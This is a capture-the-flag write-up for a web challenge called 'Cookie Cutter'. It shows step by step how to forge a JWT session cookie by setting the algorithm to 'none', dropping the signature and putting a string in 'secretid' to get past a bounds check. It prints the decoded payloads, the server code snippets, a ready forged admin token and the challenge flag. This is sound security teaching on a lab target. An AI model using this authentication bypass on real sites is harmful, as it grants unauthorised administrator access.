# Cookie Cutter
Web (200 points, 48 solves)

## Challenge 

I stumbled upon this very interesting [site](https://cookiecutter.2019.chall.actf.co/) lately while looking for cookie recipes, which claims to have a flag. However, the admin doesn't seem to be available and the site [looks secure](https://files.actf.co/be68de25b4dcd9cecd2d16fc2eb974bf3892604d9ecdeb10b7c2c21346117a54/cookie_cutter.js) - can you help me out?

Author: lamchcl

## Solution

Note: I did not solve this during the contest. 

Trying to click the admin link gets us [rolled](https://www.youtube.com/watch?v=dQw4w9WgXcQc). The site uses a JWS for the session cookie. We can paste this cookie into [JWT.io](https://jwt.io/) to decode it.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "perms": "user",
  "secretid": 4,
  "rolled": "yes",
  "iat": 1556495899
}
```

Looks like the JWS is HS256 signed and stores some information. The website will verify the JWS with the stored secret `secretid`. Our goal is to make "perms" equal to "admin" to get the flag. 

```js
if(decoded.perms=="admin"){
   res.locals.flag = true;
}
```

There is a common JWS vulnerability in which the app does not check that the algorithm in the header is the correct one. So, we can create a JWS with algorithm "none", and omit the signature.

```json
{
  "alg": "none",
  "typ": "JWT"
}
{
  "perms": "admin",
  "secretid": 4,
  "rolled": "no",
  "iat": 1556495899
}
```

But, what do we do with that `secretid`? It can't be undefined, greater than the size of the list of secrets, or less than 0. 

```js
if(sid==undefined||sid>=secrets.length||sid<0){throw "invalid sid"}
```

It turns out a string will fit these requirements. It isn't undefined, and a string compared to a number is false. When the site calls `jwt.verify()`, `secrets[sid]` will be undefined. So, we change our cookie to have a string in `secretid`. 

```json
{
  "alg": "none",
  "typ": "JWT"
}
{
  "perms": "admin",
  "secretid": "a",
  "rolled": "no",
  "iat": 1556495899
}
```

Encode this and remove the last section (signature) to get a cookie. 

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJwZXJtcyI6ImFkbWluIiwic2VjcmV0aWQiOiJhIiwicm9sbGVkIjoibm8iLCJpYXQiOjE1NTY0OTU4OTl9.
```

Visit the site with this cookie to get the flag. 

## Flag

```
actf{defund_ate_the_cookies_and_left_no_sign}
```
